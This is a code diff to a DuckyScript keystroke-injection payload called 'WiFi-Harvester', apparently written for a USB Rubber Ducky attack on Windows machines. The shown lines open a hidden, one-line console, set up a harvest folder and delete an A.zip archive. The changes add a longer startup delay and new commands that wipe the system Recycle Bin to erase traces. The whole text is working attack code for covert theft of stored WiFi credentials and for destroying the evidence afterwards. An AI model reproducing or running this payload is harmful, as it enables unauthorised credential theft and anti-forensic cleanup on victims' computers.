@@ -2,7 +2,9 @@ REM Title: WiFi-Harvester
 REM Author: tony
 REM Based on the code of: Siem TTommy
 REM: Version 1.1
-DELAY 2000
+REM --> waits for windows to open file explorer and closes it other wise it might mess up script
+DELAY 7000 
+GUI DOWNARROW
 GUI d
 DELAY 150
 GUI r
@@ -13,7 +15,6 @@ DELAY 500
 STRING color FE & mode con:cols=18 lines=1
 ENTER
 REM --> Harvest
-STRING cd Desktop
 ENTER
 STRING mkdir A
 ENTER
@@ -71,4 +72,10 @@ ENTER
 STRING S
 ENTER
 STRING del A.zip & exit
+ENTER
+STRING rmdir /s %systemdrive%\$Recycle.bin
+ENTER
+STRING y
+ENTER
+STRING exit
 ENTER
